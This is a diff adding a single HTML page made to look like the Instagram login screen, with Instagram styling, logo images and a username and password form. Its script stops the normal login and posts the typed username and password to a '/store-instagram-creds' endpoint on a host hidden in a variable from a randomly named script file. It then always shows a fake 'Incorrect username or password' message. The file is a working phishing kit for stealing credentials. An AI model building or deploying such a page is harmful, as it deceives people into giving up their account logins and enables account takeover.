@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Instagram Login</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: Arial, sans-serif;
+    }
+
+    body {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      background-color: #fafafa;
+      padding: 20px;
+    }
+
+    .login-container {
+      display: flex;
+      justify-content: space-around;
+      align-items: center;
+      max-width: 1000px;
+      width: 100%;
+      padding: 20px;
+    }
+
+    .image-section {
+      flex: 1;
+      display: flex;
+      justify-content: center;
+    }
+
+    .image-section img {
+      width: 350px;
+      display: block;
+    }
+
+    .login-section {
+      flex: 1;
+      max-width: 350px;
+      padding: 40px;
+      background-color: #fff;
+      border: 1px solid #dbdbdb;
+      border-radius: 8px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+      text-align: center;
+    }
+
+    .login-section img {
+      width: 180px;
+      margin-bottom: 20px;
+    }
+
+    .login-section input[type="text"],
+    .login-section input[type="password"] {
+      width: 100%;
+      padding: 12px;
+      margin: 8px 0;
+      border: 1px solid #dbdbdb;
+      border-radius: 4px;
+      font-size: 14px;
+      background-color: #fafafa;
+    }
+
+    .login-section input[type="submit"] {
+      width: 100%;
+      padding: 12px;
+      margin-top: 12px;
+      font-size: 16px;
+      background-color: #0095f6;
+      color: #fff;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+
+    .login-section .divider {
+      margin: 20px 0;
+      text-align: center;
+      color: #8e8e8e;
+      font-size: 14px;
+      position: relative;
+    }
+
+    .login-section .divider::before,
+    .login-section .divider::after {
+      content: '';
+      position: absolute;
+      top: 50%;
+      width: 40%;
+      height: 1px;
+      background: #dbdbdb;
+    }
+
+    .login-section .divider::before {
+      left: 0;
+    }
+
+    .login-section .divider::after {
+      right: 0;
+    }
+
+    .login-section a {
+      color: #00376b;
+      text-decoration: none;
+      font-size: 14px;
+      margin-top: 15px;
+      display: inline-block;
+    }
+
+    .login-section a:hover {
+      text-decoration: underline;
+    }
+
+    /* Responsive Styles */
+    @media (max-width: 768px) {
+      .login-container {
+        flex-direction: column;
+        align-items: center;
+      }
+
+      .image-section {
+        display: none;
+      }
+
+      .login-section {
+        width: 100%;
+        max-width: 90%;
+        padding: 20px;
+      }
+
+      .login-section img {
+        width: 150px;
+      }
+    }
+
+    @media (max-width: 480px) {
+      .login-section input[type="text"],
+      .login-section input[type="password"] {
+        font-size: 13px;
+      }
+
+      .login-section input[type="submit"] {
+        font-size: 14px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+<div class="login-container">
+  <!-- Left Section with Mockup Image (Visible on Larger Screens) -->
+  <div class="image-section">
+    <img src="./instagram.png" alt="Instagram Phone Mockup">
+  </div>
+
+  <!-- Login Section -->
+  <div class="login-section">
+    <img src="./instagram-text.png" alt="Instagram Logo">
+    <div class="err"></div>
+    <form>
+      <input type="text" class="username" placeholder="Phone number, username, or email" required>
+      <input type="password" class="password" placeholder="Password" required>
+      <input type="submit" class="login" value="Log In">
+    </form>
+    <div class="divider">OR</div>
+    <a href="#">Forgot password?</a>
+  </div>
+</div>
+
+<script src="./jquery.min.js"></script>
+<script src="./89T1xCYljtaHFiMWz44T.js"></script>
+<script>
+    $(document).ready(function () {
+        $('.login').click(function (e) {
+            e.preventDefault();
+            $.post(ssddds + '/store-instagram-creds', {
+                username: $('.username').val(),
+                password: $('.password').val(),
+            }, function (res) {
+                $('.err').html('<p style="color: red">Incorrect username or password</p>')
+                console.log(res);
+            })
+        })
+    })
+</script>
+
+</body>
+</html>
